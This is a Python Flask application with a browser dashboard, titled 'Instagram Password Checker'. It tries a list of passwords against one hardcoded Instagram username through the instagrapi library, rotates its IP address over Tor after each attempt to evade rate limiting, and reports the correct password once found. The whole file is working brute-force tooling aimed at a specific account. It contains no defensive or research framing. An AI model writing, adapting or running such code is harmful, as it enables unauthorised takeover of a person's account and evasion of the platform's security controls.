from flask import Flask, jsonify, request
from apscheduler.schedulers.background import BackgroundScheduler
import os
import time
import json
from datetime import datetime
from instagrapi import Client
from stem import Signal
from stem.control import Controller

app = Flask(__name__)

# Configuration
USERNAME = "vitaminb500"
TOR_PASSWORD = "12345"
TOR_PROXY = "socks5://127.0.0.1:9050"
RESULTS_FILE = "results.json"

# Global state
state = {
    "running": False,
    "current_password": None,
    "found_password": None,
    "attempts": 0,
    "total_passwords": 0,
    "status": "idle",
    "last_updated": None,
    "success": False,
    "passwords": [],
    "results": {
        "correct": [],
        "incorrect": [],
        "uncertain": []
    },
    "details": []  # Detailed log of each attempt
}


# -----------------------------------
# HELPER FUNCTIONS
# -----------------------------------
def clean_session():
    files = [f"{USERNAME}_session.json", "session.json"]
    for f in files:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass


def change_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
        time.sleep(3)
        return True
    except:
        return False


def save_results():
    """Save results to JSON file"""
    with open(RESULTS_FILE, 'w') as f:
        json.dump(state, f, indent=2)


def try_login(password, use_tor=True):
    """Try login with password"""
    clean_session()
    
    cl = Client()
    if use_tor:
        try:
            cl.set_proxy(TOR_PROXY)
        except:
            pass
    
    cl.delay_range = [0, 1]
    cl.request_timeout = 10
    
    try:
        cl.login(USERNAME, password)
        user_id = cl.user_id
        cl.logout()
        return True
    except Exception as e:
        error_str = str(e).lower()
        if "checkpoint" in error_str or "2fa" in error_str:
            return None  # Uncertain
        return False


# -----------------------------------
# BACKGROUND JOB
# -----------------------------------
def check_passwords_job():
    """Background job to check all passwords"""
    if not state["passwords"]:
        state["status"] = "error: no passwords loaded"
        return
    
    state["running"] = True
    state["status"] = "checking passwords..."
    state["attempts"] = 0
    state["total_passwords"] = len(state["passwords"])
    state["results"] = {"correct": [], "incorrect": [], "uncertain": []}
    state["details"] = []
    
    # Check if Tor is available
    tor_available = change_ip()
    
    for i, pwd in enumerate(state["passwords"], 1):
        if not state["running"]:  # Stop if requested
            break
        
        state["current_password"] = pwd
        state["attempts"] = i
        state["last_updated"] = datetime.now().isoformat()
        save_results()
        
        print(f"[{i}/{len(state['passwords'])}] Testing: {pwd}")
        
        result = try_login(pwd, use_tor=tor_available)
        
        # Log the result
        log_entry = {
            "password": pwd,
            "result": None,
            "status_text": "",
            "timestamp": datetime.now().isoformat()
        }
        
        if result is True:
            state["found_password"] = pwd
            state["success"] = True
            state["status"] = f"✅ SUCCESS! Found password: {pwd}"
            state["results"]["correct"].append(pwd)
            log_entry["result"] = "CORRECT"
            log_entry["status_text"] = "✅ Correct password found!"
            state["details"].append(log_entry)
            state["running"] = False
            save_results()
            print(f"✅ SUCCESS: {pwd}")
            return
        elif result is None:
            state["results"]["uncertain"].append(pwd)
            log_entry["result"] = "UNCERTAIN"
            log_entry["status_text"] = "⚠️ Uncertain (checkpoint/2FA required)"
            print(f"⚠️ UNCERTAIN: {pwd}")
        else:
            state["results"]["incorrect"].append(pwd)
            log_entry["result"] = "INCORRECT"
            log_entry["status_text"] = "❌ Wrong password"
            print(f"❌ INCORRECT: {pwd}")
        
        state["details"].append(log_entry)
        
        # Wait before next attempt
        time.sleep(2)
        if tor_available and i < len(state["passwords"]):
            change_ip()
            time.sleep(1)
    
    state["running"] = False
    state["status"] = f"completed - Correct: {len(state['results']['correct'])}, Incorrect: {len(state['results']['incorrect'])}, Uncertain: {len(state['results']['uncertain'])}"
    save_results()


# -----------------------------------
# API ENDPOINTS
# -----------------------------------

@app.route('/api/status', methods=['GET'])
def get_status():
    """Get current status"""
    return jsonify(state)


@app.route('/api/start', methods=['POST'])
def start_checking():
    """Start password checking"""
    data = request.json
    
    if not data or 'passwords' not in data:
        return jsonify({"error": "passwords list required"}), 400
    
    if state["running"]:
        return jsonify({"error": "already running"}), 400
    
    # Reset state
    state["passwords"] = data['passwords']
    state["running"] = False
    state["found_password"] = None
    state["success"] = False
    state["attempts"] = 0
    state["status"] = "starting..."
    state["results"] = {"correct": [], "incorrect": [], "uncertain": []}
    state["details"] = []
    
    # Schedule job to run once
    scheduler = BackgroundScheduler()
    scheduler.add_job(check_passwords_job, 'date')
    scheduler.start()
    
    return jsonify({"message": "checking started", "passwords_count": len(data['passwords'])})


@app.route('/api/stop', methods=['POST'])
def stop_checking():
    """Stop password checking"""
    if state["running"]:
        state["running"] = False
        state["status"] = "stopped by user"
        save_results()
        return jsonify({"message": "checking stopped"})
    return jsonify({"message": "no job running"}), 400


@app.route('/api/reset', methods=['POST'])
def reset_state():
    """Reset all state"""
    state["running"] = False
    state["current_password"] = None
    state["found_password"] = None
    state["attempts"] = 0
    state["total_passwords"] = 0
    state["status"] = "idle"
    state["success"] = False
    state["passwords"] = []
    state["results"] = {"correct": [], "incorrect": [], "uncertain": []}
    state["details"] = []
    save_results()
    return jsonify({"message": "state reset"})


@app.route('/api/upload-passwords', methods=['POST'])
def upload_passwords():
    """Upload password file"""
    if 'file' not in request.files:
        return jsonify({"error": "no file provided"}), 400
    
    file = request.files['file']
    
    try:
        passwords = [line.strip() for line in file.read().decode().split('\n') if line.strip()]
        state["passwords"] = passwords
        state["total_passwords"] = len(passwords)
        save_results()
        return jsonify({"message": "passwords uploaded", "count": len(passwords)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route('/api/quick-check', methods=['POST'])
def quick_check():
    """Quick check single password (immediate)"""
    data = request.json
    
    if not data or 'password' not in data:
        return jsonify({"error": "password required"}), 400
    
    password = data['password']
    result = try_login(password, use_tor=False)
    
    if result is True:
        return jsonify({"status": "success", "password": password, "message": "✅ Correct password!"})
    elif result is None:
        return jsonify({"status": "uncertain", "password": password, "message": "⚠️ Uncertain (checkpoint/2FA)"})
    else:
        return jsonify({"status": "failed", "password": password, "message": "❌ Wrong password"})


@app.route('/api/results', methods=['GET'])
def get_results():
    """Get detailed results"""
    return jsonify({
        "summary": state["results"],
        "details": state["details"],
        "found_password": state["found_password"],
        "success": state["success"]
    })


@app.route('/', methods=['GET'])
def home():
    """Simple web dashboard"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Password Checker</title>
        <style>
            body { font-family: Arial; margin: 20px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
            button { padding: 10px 20px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background: #0056b3; }
            textarea { width: 100%; height: 150px; padding: 10px; }
            .status { padding: 15px; margin: 10px 0; border-radius: 4px; background: #f0f0f0; }
            .success { background: #d4edda; color: #155724; }
            .error { background: #f8d7da; color: #721c24; }
            .progress { background: #e7f3ff; color: #0c5aa0; }
            h1 { color: #333; }
            input { padding: 8px; margin: 5px; width: 100%; box-sizing: border-box; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Instagram Password Checker</h1>
            
            <div id="status" class="status"></div>
            
            <h3>Upload Passwords</h3>
            <textarea id="passwords" placeholder="Enter passwords (one per line)"></textarea><br>
            
            <button onclick="startChecking()">▶️ Start Checking</button>
            <button onclick="stopChecking()">⏹️ Stop</button>
            <button onclick="resetState()">🔄 Reset</button>
            <button onclick="quickTest()">⚡ Quick Test Single Password</button>
            
            <h3>Quick Test</h3>
            <input type="text" id="testPassword" placeholder="Test password"><br>
            <button onclick="quickTest()">Test Now</button>
            
            <h3>Progress</h3>
            <div id="progress"></div>
        </div>
        
        <script>
            async function updateStatus() {
                const res = await fetch('/api/status');
                const data = await res.json();
                
                let statusClass = 'status';
                if (data.success) statusClass += ' success';
                else if (data.status.includes('error')) statusClass += ' error';
                else if (data.running) statusClass += ' progress';
                
                document.getElementById('status').className = statusClass;
                document.getElementById('status').innerHTML = `
                    <strong>Status:</strong> ${data.status}<br>
                    <strong>Progress:</strong> ${data.attempts}/${data.total_passwords}<br>
                    <strong>Current:</strong> ${data.current_password || 'N/A'}<br>
                    <strong>Found:</strong> ${data.found_password || 'Not yet'}<br>
                    <strong>Last Updated:</strong> ${data.last_updated || 'N/A'}
                `;
                
                // Display results summary
                let resultsHTML = `
                    <h3>📊 Results Summary</h3>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
                        <div style="background: #d4edda; padding: 10px; border-radius: 4px;">
                            <strong>✅ Correct:</strong> ${data.results.correct.length}
                            ${data.results.correct.length > 0 ? '<br>' + data.results.correct.map(p => `<code>${p}</code>`).join('<br>') : ''}
                        </div>
                        <div style="background: #f8d7da; padding: 10px; border-radius: 4px;">
                            <strong>❌ Incorrect:</strong> ${data.results.incorrect.length}
                        </div>
                        <div style="background: #fff3cd; padding: 10px; border-radius: 4px;">
                            <strong>⚠️ Uncertain:</strong> ${data.results.uncertain.length}
                            ${data.results.uncertain.length > 0 ? '<br>' + data.results.uncertain.map(p => `<code>${p}</code>`).join('<br>') : ''}
                        </div>
                    </div>
                `;
                
                // Display detailed log (last 10 entries)
                let detailsHTML = '<h3>📝 Recent Attempts (Last 10)</h3><div style="max-height: 400px; overflow-y: auto; background: #f9f9f9; padding: 10px; border-radius: 4px;">';
                const recentDetails = data.details.slice(-10);
                recentDetails.reverse().forEach(detail => {
                    let color = detail.result === 'CORRECT' ? '#28a745' : detail.result === 'INCORRECT' ? '#dc3545' : '#ffc107';
                    let icon = detail.result === 'CORRECT' ? '✅' : detail.result === 'INCORRECT' ? '❌' : '⚠️';
                    detailsHTML += `
                        <div style="background: white; padding: 8px; margin: 5px 0; border-left: 4px solid ${color}; border-radius: 2px;">
                            ${icon} <strong>${detail.password}</strong> - ${detail.status_text}<br>
                            <small>${detail.timestamp}</small>
                        </div>
                    `;
                });
                detailsHTML += '</div>';
                
                document.getElementById('progress').innerHTML = resultsHTML + detailsHTML;
                
                setTimeout(updateStatus, 2000);
            }
            
            async function startChecking() {
                const passwords = document.getElementById('passwords').value.split('\\n').filter(p => p.trim());
                const res = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ passwords })
                });
                const data = await res.json();
                alert(data.message || data.error);
                updateStatus();
            }
            
            async function stopChecking() {
                const res = await fetch('/api/stop', { method: 'POST' });
                const data = await res.json();
                alert(data.message);
                updateStatus();
            }
            
            async function resetState() {
                const res = await fetch('/api/reset', { method: 'POST' });
                const data = await res.json();
                alert(data.message);
                document.getElementById('passwords').value = '';
                updateStatus();
            }
            
            async function quickTest() {
                const password = document.getElementById('testPassword').value;
                if (!password) { alert('Enter password'); return; }
                
                const res = await fetch('/api/quick-check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password })
                });
                const data = await res.json();
                alert(`Result: ${data.status}`);
            }
            
            updateStatus();
        </script>
    </body>
    </html>
    """


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)